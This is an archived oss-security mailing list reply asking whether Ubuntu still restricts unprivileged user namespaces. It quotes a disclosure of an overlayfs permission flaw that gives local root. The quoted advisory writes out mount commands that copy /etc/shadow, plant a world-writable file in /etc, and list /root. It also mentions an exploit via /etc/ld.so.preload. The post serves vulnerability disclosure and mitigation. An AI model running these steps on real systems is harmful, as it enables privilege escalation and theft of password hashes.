  oss-security - Re: incorrect permission checks in  overlayfs, ubuntu local root            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Tue, 16 Jun From: Alban Crequy <alban.crequy@...il.com> To: oss-security@...ts.openwall.com Subject: Re: incorrect permission checks in  overlayfs, ubuntu local root  Hi,  Do Ubuntu kernels still disable unprivileged CLONE_NEWUSER by default, unless changed in /proc/sys/kernel/unprivileged_userns_clone? I see the patch in Debian but I don't know if it is still in Ubuntu: http://anonscm.debian.org/viewvc/kernel/dists/trunk/linux/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch?view=markup  It should limit the scope of the issue to configurations where root sets up user namespaces.  Best regards, Alban  On 16 June at Philip Pettersson <philip.pettersson@...il.com> wrote: > Hello, this is which allows a local root privilege escalation > in the default configuration on all currently supported versions of Ubuntu. > > The overlayfs filesystem does not correctly check file permissions when > creating new files in the upper filesystem directory. This can be exploited > by an unprivileged process in kernels with CONFIG_USER_NS=y and where > overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs > inside unprivileged mount namespaces. This is the default configuration of > Ubuntu and [1]. > > If you don't want to update your kernel and you don't use overlayfs, a viable > workaround is to just remove or blacklist overlayfs.ko / overlay.ko. > > Details > ================================ > > From Documentation/filesystems/overlayfs.txt [2]: > > "Objects that are not directories (files, symlinks, device-special > files etc.) are presented either from the upper or lower filesystem as > appropriate.  When a file in the lower filesystem is accessed in a way > the requires write-access, such as opening for write access, changing > some metadata etc., the file is first copied from the lower filesystem > to the upper filesystem (copy_up)." > > The ovl_copy_up_* functions do not correctly check that the user has > permission to write files to the upperdir directory. The only permissions > that are checked is if the owner of the file that is being modified has > permission to write to the upperdir. Furthermore, when a file is copied from > the lowerdir the file metadata is carbon copied, instead of attributes such as > owner being changed to the user that triggered the copy_up_* procedures. > > Example of creating a 1:1 copy of a root-owned file: > > (Note that the workdir= option is not needed on older kernels) > > ./create-namespace > mount -t overlay -o > lowerdir=/etc,upperdir=upper,workdir=work overlayfs o > chmod work/work/ > cd o > mv shadow copy_of_shadow > (exit the namespace) > ls -al upper/copy_of_shadow > -rw-r----- 1 root shadow May 24 upper/copy_of_shadow > stat upper/copy_of_shadow /etc/shadow|grep Inode > Device:      Inode:      Links: 1 > Device:      Inode:      Links: 1 > > Now we can place this file in /etc by switching "upper" to be the lowerdir > option, the permission checks pass since the file is owned by root and root > can write to /etc. > > ./create-namespace > mount -t overlay -o > lowerdir=upper,upperdir=/etc,workdir=work overlayfs o > chmod work/work/ > cd o > chmod copy_of_shadow > exit > ls -al /etc/copy_of_shadow > -rwxrwxrwx 1 root shadow May 24 /etc/copy_of_shadow > > The attached exploit gives a root shell by creating a world-writable > /etc/ld.so.preload file. The exploit has been tested on the most recent > kernels before on Ubuntu and > > It is also possible to list directory contents for any directory on the system > regardless of permissions: > > ls -al /root > ls: cannot open directory /root: Permission denied > mkdir o upper work > mount -t overlayfs -o > lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work > overlayfs /home/user/o > ls -al o 2>/dev/null > total 8 > drwxrwxr-x 1 root nogroup May 24 . > drwxr-xr-x 8 root nogroup May 24 .. > -????????? ? ?    ?          ?            ? .bash_history > -????????? ? ?    ?          ?            ? .bashrc > d????????? ? ?    ?          ?            ? .cache > -????????? ? ?    ?          ?            ? .lesshst > d????????? ? ?    ?          ?            ? > > > Credit > ================================ > Philip Pettersson, Samsung SDS Security Center > > References > ================================ > [1] > [2] https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt > [3]  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      